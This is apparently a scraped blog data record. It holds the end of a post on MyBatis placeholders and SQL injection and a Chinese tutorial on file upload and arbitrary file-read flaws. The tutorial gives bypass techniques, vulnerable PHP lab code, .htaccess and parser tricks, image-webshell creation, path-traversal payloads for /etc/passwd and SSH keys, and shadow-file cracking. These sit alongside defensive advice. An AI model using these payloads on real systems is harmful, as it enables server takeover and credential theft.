((PreparedQuery&lt;?&gt;) this.query).fillSendPacket(); 拿到的 Message 对象是 null，然后进一步追踪到最后向 MySQL 发送请求的地方 NativeSession.execSQL： public &lt;T extends Resultset&gt; T execSQL(Query callingQuery, String query, int maxRows, NativePacketPayload packet, boolean streamResults, ProtocolEntityFactory&lt;T, NativePacketPayload&gt; resultSetFactory, ColumnDefinition cachedMetadata, boolean isBatch) { // ... ... try { // 如果 sendPacket 为 null，则调用 sendQueryString 方法，把原始 sql 和参数序列化为二进制数据包 return packet == null ? ((NativeProtocol) this.protocol).sendQueryString(callingQuery, query, this.characterEncoding.getValue(), maxRows, streamResults, cachedMetadata, resultSetFactory) // 否则调用 sendQueryPacket 方法，直接发送数据包 : ((NativeProtocol) this.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, cachedMetadata, resultSetFactory); } // ... ... } 更具体的实现就不看了，基本都是关于序列化请求参数的逻辑。 三、Myabtis占位符与预编译 至此问题真相大白了，不过还是顺带扯一下八股文常提到的 Mybatis 占位符 #{} 与 ${} 是如何影响 SQL 注入问题的。 当然，看完上面的内容其实就已经很好猜到原因了： #{} 对应的内容会作为 SQL 参数的一部分通过 PreparedStatement.setXXX 装入请求； ${} 对应的内容会直接作为 SQL 模板的一部分，而不会视为独立的请求参数； 在 Mybatis 中，用于解析占位符的类为 GenericTokenParser ，根据它我们很容易在源码中找到占位符的处理方法，从而验证我们的猜想： 其中，#{} 占位符在 SqlSourceBuilder.ParameterMappingTokenHandler.handleToken 方法中处理： public String handleToken(String content) { parameterMappings.add(buildParameterMapping(content)); return \"?\"; } 可见 #{} 占位符会被解析为 ? 占位符，而对于的数据会被添加到 parameterMappings 用于后续塞到 PreparedStatement。 而 ${} 占位符在 PropertyParser.VariableTokenHandler.handleToken 方法中被处理： public String handleToken(String content) { if (variables != null) { String key = content; if (enableDefaultValue) { final int separatorIndex = content.indexOf(defaultValueSeparator); String defaultValue = null; if (separatorIndex &gt;= 0) { key = content.substring(0, separatorIndex); defaultValue = content.substring(separatorIndex + defaultValueSeparator.length()); } if (defaultValue != null) { return variables.getProperty(key, defaultValue); } } if (variables.containsKey(key)) { return variables.getProperty(key); } } return \"${\" + content + \"}\"; } 若占位符符合规范，则占会根据占位符中的内容去用户给定的参数中取值，并且让值直接替换掉原本 SQL 脚本中的 ${} 占位符。 这就是“ Mybatis 用 #{} 而不是 ${} 可以防止 SQL 注入的真相。 总结 回顾一下全文，当我们说“预编译”的时候，其实这个功能来自于数据库的支持，它的原理是先编译带有占位符的 SQL 模板，然后在传入参数让数据库自动替换 SQL 中占位符并执行，在这个过程中，由于预编译好的 SQL 模板本身语法已经定死，因此后续所有参数都会被视为不可执行的非 SQL 片段被转义，因此能够防止 SQL 注入。 当我们通过 JDBC 使用 PreparedStatement 执行预编译 SQL 的时候，此处的预编译实际上是假的预编译（至少 MySQL 是如此，不过其他数据库仍待确认），PreparedStatement 只是在设置参数的时候自动做了一层转义，最终提交给数据库执行的 SQL 仍然是单条的非预编译 SQL。 而当我们通过在驱动 url 上开启 useServerPrepStmts 配置后，预编译就会真正的生效，驱动包发往数据库的请求就会分成带占位符的 SQL 模板和参数，到了数据库再由数据库完成格式化并执行。 此外，八股文常提到的“Mybatis 的 #{} 相比 ${} 可以防止 SQL 注入”这一点，本质上是因为 #{} 占位符会被解析为 SQL 模板中的 ? 占位符，而 ${} 占位符会被直接解析为 SQL 模板的一部分导致的。 最后脑补一下，由于 useServerPrepStmts 不开启时 PreparedStatement 的预编译实际上是假的预编译，所以理论上使用 #{} 也并非绝对安全，如果有办法绕过 PreparedStatement 的检查，那么数据库拿到被注入过的 SQL 直接执行，依然有暴毙的风险。","categories":["常见top漏洞"]},{"title":"浅析文件操作漏洞","path":"/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/","content":"0x01 文件上传 先了解一下基础知识 要深入了解文件上传，必须了解上传属性、常见文件的结构、图形处理函数等内容。 1） 报文特点： 观察文件上传报文的特点： Header中Content-Type特征有二： 1.multipart/form-data（form表单的enctype属性，规定为二进制数据） 2.boundary字符串（作用为分隔符，以区分POST数据） POST内容特征有五： 1.Content-Disposition：form-data 2. name：input表单名 3.filename：文件名 4.Content-Type：定义文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件； 5.boundary：Content-Type的值前面加了两个--- 2） 常见校验规则 现存常用的上传校验规则无非下面几类： 1.客户端javascript校验（后缀名） 2.文件头content-type字段校验（image/gif）：附带参数 4.后缀名黑/白名单校验：扩展名 5.文件内容头校验：GIF89a 6.文件内容校验：文件信息，二次渲染 7.自定义正则校验 3）一个澄清 ​ 文件上传和文件解析是两个过程，即使我们上传的是php文件，但解析为图片，访问php文件会显示“图片无法显示”；或者我们上传的是jpg文件，但里面混有shell脚本，若被解析为php文件也会执行；又或者上传处没法绕过检测，只能上传jpg文件，但在其他功能处存在文件包含等功能，仍可执行成功。 还是回到安全的本质，上传是“输入”，那文件解析就是“输出”，任何漏洞挖掘都需要结合输入+输出。 4) 挖掘思路 上传漏洞挖掘思路总结起来分三步： 1、首先尝试直接上传脚本文件进行RCE； 2、若存在过滤，对于检测机制进行猜测，确定机制后尝试绕过； 3、若无法绕过上传，插入脚本后寻找解析/文件包含漏洞； 4、换其他类型文件：html、js、svg等转到挖掘其他漏洞。 一、文件上传常见场景 场景： 1.客户端JavaScript检测 如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。这种前端采用JS限制上传类型和大小的方式 绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制 2.服务器后端检测 服务器后端检测有较多方式，普遍分为文件类型检测，文件头类型，文件扩展名名单检测，文件内容检测，接下来进行简要分析。 a.文件类型检测 此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型 (如\"image/gif\",\"image/png\",\"image/jpeg\") 绕过思路：抓包将content-type改为可接受图片形式，即可绕过 b.文件头类型检测 上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型 绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过 c.文件扩展名检测 这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。 黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用 基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。 白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。 注：00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。 d.文件内容检测 比较厉害的防护检测，就是针对内容做检测，这种防护能力比较强，但也不是不能绕过。自始至终，攻防都是在对抗中螺旋演进的。 这种检测防护基本都是从webshell具有的代表性敏感字符?或者危险敏感函数。 绕过思路：从特殊敏感字符开始进行Fuzz测试，探测webshell中有多少必要的字符存在被替换，如果构成webshell执行的字符被替换得较多，剩下未过滤的字符的难以支撑webshell执行，可以换个角度利用系统，调用脚本语言，如&lt;script language='php'&gt;system('ls');&lt;script&gt;。 e.对图片进行二次渲染 绕过思路：借鉴二进制中钩子的思想，其实就是想在上传图片中找一块\"地方\"，存储webshell，这块\"地方\"要求在后端处理后没有被过滤掉。那就上传一个正常的文件，然后下载下来，diff一下，查看哪些位置没有被改动过，然后添加webshell进行尝试。 二、文件上传漏洞的原理 文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而WEB系统没有进行检测或逻辑做的不够安全。 文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。 一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。 存在文件上传功能的地方都有可能存在文件上传漏洞，比如相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带，另外像文件管理器这样的功能也有可能被攻击者所利用。 这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等 三、利用方式 1.上传WebShell文件，攻击者可通过这些网页后门执行命令并控制服务器。 2.上传文件是钓鱼图片或者包含了脚本的图片时，图片中的脚本，在某些版本的浏览器上会被作为脚本执行，从而被利用于钓鱼或者欺诈 3.上传病毒、木马文件，用于诱骗用户和管理员下载执行或者直接自动运行。 4.上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击。 常用防御方式: 1.检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 ) 2.文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 . 3.文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 ) 4.图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 ) 5.文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 ) 6.隐藏上传路径 7.文件内容检测 ( 避免图片中插入 webshell) 四、绕过方式 1.前端检测 主要是通过JavaScript代码进行检测，是最简单的绕过 绕过方法： 删除或者禁用js：火狐–&gt;点击JS使其为灰色-&gt;成功禁用 使用代理上传文件，brup suite；上传符合要求的文件类型，抓包修改文件类型 2.后端_扩展名检测 针对文件的扩展名后缀进行检测，主要通过黑白名单进行过滤检测，若不符合过滤规则则不允许上传。 2.1黑名单 黑名单检测：一般有个专门的blacklist文件或列举出黑名单，里面会包含常见的危险脚本文件。 绕过方法 大小写绕过： 服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成php文件解析。 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']);//去除字符串收尾的空白字符 $file_name = deldot($file_name);//删除文件名末尾的点(这是自定义的函数) $file_ext = strrchr($file_name, '.');//查找'.'在字符串中最后一次出现的位置 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { //检查第一个参数中的内容是否在第二个参数(即数组中) $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 通过源代码可见，黑名单里虽然看似过滤得很全面，但还是出现了纰漏–没有将后缀名转为小写，若后缀名为.pHP，则可以进行大小写绕过，成功上传文件。 $file_ext = strtolower($file_ext); //转换为小写 修改后缀名绕过： 名单中不允许上传.asp，.php，.jsp，.exe后缀的文件 但可上传 —asa cer aspx —php php3 php4 php5 phtml pht —jspx jspf —exee 前提是apache的httpd.conf中有如下配置代码 1 | AddType application/x-httpd-php .php .phtml .phps .php5 .pht 当我们修改文件名后，可以发现文件上传成功 重写（双写）绕过 服务端将黑名单的后缀名替换为空，但只进行一次。上传.pphphp后缀，替换一个php为空，则后缀名变为.php，成功绕过。 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } 利用Windows的命名机制 shell.php. shell.php空格 shell.php:1.jpg shell. php::$DATA shell.php:1.jpg 在Windows中，后缀名后面的点和空格都会被删除掉 2.2白名单 原理：白名单检测:一般有个专门的 whitelist 文件，里面会包含的正常文件： Jpg png GIF 绕过方法 3.后端检测_00截断 点击进入： 【文件上传绕过】——后端检测_文件名检测00截断绕过 原理：虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。 思路： 在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。 这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。 使用burpsuite进行抓包，因为这里是通过URL进行传递的文件上传后存储路径，所以需要对16进制的00进行URL编码，编码的结果就是%00，通过这种方式，就可以用%00截断后面的内容，让拼接的文件名不再进行生效： 4.后端检测_MIME检测： MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。 常见MIME类型 text/plain （纯文本） text/html （HTML文档） text/javascript （js代码） application/xhtml+xml （XHTML文档） image/gif （GIF图像） image/jpeg （JPEG图像） image/png （PNG图像） video/mpeg （MPEG动画） application/octet-stream （二进制数据） application/pdf （PDF文档） 检测方式： 在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。 MIME绕过原理： 部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。 5.后端检测_文件头检测漏洞 原理： 在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。 常见文件头 GIF：47 49 46 38 39 61 png： 89 50 4E 47 0D 0A 1A 0A jpg：FF D8 FF E0 00 10 4A 46 49 46 在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。 6.后端_内容检测图片马绕过 原理: 一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。 图片马制作 准备一张图片，这里为a.png，和一个一句话木马，通过以下命令合成一个图片马3.php： a.php内容： &lt;?php phpinfo(); ?&gt; 命令: 1 | copy a.png /b + a.php /a 3.png 2 | /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件 3 | /a:指定以ascii格式复制、合并文件用于txt等文本类文件 这个图片搞错了，最后应该是png 注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为`3.png文件。 7.解析漏洞 7.1 .htaccess文件解析漏洞 漏洞利用前提： web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。 原理： .htaccess文件(或者\"分布式配置文件\") ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 利用方式： 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。 .htaccess文件内容： .htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。 &lt;FilesMatch \"evil.gif\"&gt; SetHandler application/x-httpd-php #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行 AddHandler php5-script .gif #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行 &lt;/FilesMatch&gt; AddType application/x-httpd-php .gif 7.2 Apache解析漏洞 原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。 7.3 IIS6.0解析漏洞 IIS6.0解析漏洞分两种： 1、目录解析： 以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。 2、文件解析： xx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。 IIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。 7.4 IIS7.0 | IIS7.5 | Nginx的解析漏洞 原理： Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。 这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。 举个例子，当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推。 漏洞形式：www.xxxxx.com/UploadFiles/image/1.jpg/1.php 另外两种解析漏洞： www.xxxxx.com/UploadFiles/image/1.jpg%00.php www.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php 7.5 Nginx 漏洞 PHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。 利用条件: 以FastCGl运行 cgi.fix_pathinfo=1(全版本PHP默认为开启) 例如如果满足上述条件，当你访问url/shell.jpg/shell.php时，shell.jpg会被当作php去执行。 7.6 Nginx 文件名逻辑漏洞(CVE-2013-4547) 影响版本:Nginx 0.8.41 ~ 1.4.3/1.5.0 ~ 1.5.7 利用过程: 上传一个shell.jpg文件，注意最后为空格 访问url/shell.jpg[Ox20][Ox00].php (两个中括号中的数字是用Burp在Hex界面中更改) 漏洞复现参考链接 8.二次渲染漏洞 原理： 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。 绕过： 1、配合文件包含漏洞： 将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的 那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。 2、可以配合条件竞争： 这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传 如何判断图片是否进行了二次处理？ 对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。 9.条件竞争 $is_upload = false; $msg = null; //判断文件上传操作 if(isset($_POST['submit'])){ //判断是否接收到这个文件 $ext_arr = array('jpg','png','gif'); //声明一个数组，数组里面有3条数据，为：'jpg','png','gif' $file_name = $_FILES['upload_file']['name']; //获取图片的名字 $temp_file = $_FILES['upload_file']['tmp_name']; //获取图片的临时存储路径 $file_ext = substr($file_name,strrpos($file_name,\".\")+1); //通过文件名截取图片后缀 $upload_file = UPLOAD_PATH . '/' . $file_name; //构造图片的上传路径，这里暂时重构图片后缀名。 if(move_uploaded_file($temp_file, $upload_file)){ //这里对文件进行了转存 if(in_array($file_ext,$ext_arr)){ //这里使用截取到的后缀名和数组里面的后缀名进行对比 $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; //如果存在，就对文件名进行重构 rename($upload_file, $img_path); //把上面的文件名进行重命名 $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; //否则返回\"只允许上传.jpg|.png|.gif类型文件！\"数据。 unlink($upload_file);// 并删除这个文件 } }else{ $msg = '上传出错！'; } } 代码处理流程：声明一个数组，保存着允许上传的文件类型–&gt;获取文件名和文件临时存储路径–&gt;截取文件名–&gt;构造文件上传后的存储路径–&gt;对文件进行转存–&gt;比对白名单，如果存在就对文件进行重命名–&gt;否则就删除文件。 通过上面代码我们发现： 服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。 我们上传一个文件上去，后端会检验上传文件是否和要求的文件是否一致。如果不能达到要求就会删除文件，如果达成要求就会保留，那么当我们上传文件上去的时候，检测是否到达要求需要一定的时间，这个时间可长可短，但是我们确确实实在某一刻文件已经上传到了指定地址，并且访问到这个文件。这时候就会造成条件竞争。 参考: 【文件上传绕过】——文件上传漏洞基础入门 太厉害了，终于有人能把文件上传漏洞讲的明明白白了—这里还讲了webshell相关内容 五、防御技巧 1、文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。 2、判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的，严格过滤扩展名为“.php、.asp、.bat”等可执行文件上传。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。 3、使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。 4、单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。 5、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。 6、隐藏文件上传目录，用户上传文件的目标目录对用户隐藏。 六、如何构造优质FUZZ字典 构造优质上传漏洞Fuzz字典 0x02 文件读取与下载 文件读取常见函数: fopen file_get_contents fread fgets fgetss file fpassthru parse_ini_file readfile 1. 为什么产生任意文件读取与下载漏洞 一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。 2. 任意文件读取漏洞 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。 漏洞产生原因 存在读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容 任意文件读取 &lt;?php $filename=”test.txt”; readfile($filename); ?&gt; &lt;?php $filename=”test.txt”; echo file_get_contents($filename); ?&gt; 文件读取函数 readfile()、file_get_contents()、fopen()中，$filename没有经过校验或者校验不合格，用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini。 3. 文件读取漏洞挖掘 1、web漏洞扫描器（awvs、appscan、openvas、nessus） 2、手动挖掘从连接和参数名查看 Google search inurl:”readfile.php?file= inurl:”read.php?filename= inurl:”download.php?file= inurl:”down.php?file= 连接： readfile.php?file=**.txt download.php?file=**.rar 参数名： &amp;RealPath=、&amp;readpath=、&amp;FilePath=、&amp;filepath=、&amp;Path=、&amp;path=、&amp;Inputfile=、&amp;inputfile=、&amp;url=、&amp;urls=、&amp;Lang=、&amp;dis=、&amp;Data=、&amp;data=、&amp;readfile=、&amp;ﬁlep=、&amp;Src=、&amp;src=、&amp;menu=、META-INF= 、WEB-INF 4. 敏感信息 Windows： C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 Linux： /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /etc/my.cnf //mysql 配置文件 /etc/httpd/conf/httpd.conf // Apache配置文件 /root/.bash_history //用户历史命令记录文件 /root/.mysql_history //mysql历史命令记录文件 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts //记录系统挂载设备 /porc/config.gz //内核配置文件 /var/lib/mlocate/mlocate.db //全文件路径 /porc/self/cmdline //当前进程的cmdline参数 5. 绕过思路 可以进行fuzz 1. url编码代替.或者/，如使用%2F代替/ ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd 2. 二次编码(%25) ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd 3. 加入+ ?filename=.+./.+./bin/redacted.dll 4. %00 ?filename=.%00./file.php /etc/passwd%00.jpg 5. \\ ?filename=..%5c..%5c/windows/win.ini 6. Java %c0%ae 安全模式绕过 ?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd 6. Linux下的常见利用姿势 6.1 用户目录下的敏感文件 .bash_history .zsh_history .psql_history .mysql_history .profile .bashrc .gitconfig .viminfo 任意文件读取/etc/passwd 提取passwd第一列，即root等一系列用户名 读history：../../root/.bash_history 暴破所有用户的.bash_history：../../../home/§root§/.bash_history 历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。 PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。 6.2 主机凭证文件 私钥文件 /root/.ssh/id_rsa 私钥 /root/.ssh/authorized_keys 公钥存储文件 /root/.ssh/id_rsa.keystore /root/.ssh/known_hosts //记录每个访问计算机用户的公钥 私钥文件如果没有设定密码保护，便可直接获取到进行登录到服务器，或使用xshell等软件选择证书登录。 ssh -i id_rsa root@IP地址 系统密码 /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin ...... 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell 可以看到哪些用户可以登录 /etc/shadow root:$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1:14181:0:99999:7::: $id$salt$密文 id代表的是使用不同的加密算法，不同的系统使用的算法也不尽相同。salt是加密的时候需要用到盐。最后就是密文。 注意：如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码。 格式 算法 $1 md5 $2a blowfish $2y blowfish $5 sha-256 $6 sha-512 在线查询 https://www.cmd5.com/ john破解 unshadow /etc/passwd /etc/shadow &gt; test_passwd john --wordlist=字典路径 test_passw 默认密码字典位于/usr/share/john/password.ls 6.3 全路径 mlocate.db数据库里存储了本地所有文件的配置信息 /var/lib/mlocate/mlocate.db 利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息 locate mlocate.db config把包含config的路径全输出出来 locate mlocate.db webapps locate mlocate.db www 获取到路径后可以进一步挖掘敏感信息和系统漏洞 7. 程序源代码 利用全路径或者其他地方获取到的路径读取一些关键的程序源码。 读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。 读取war包，反编译获取源码。 8. 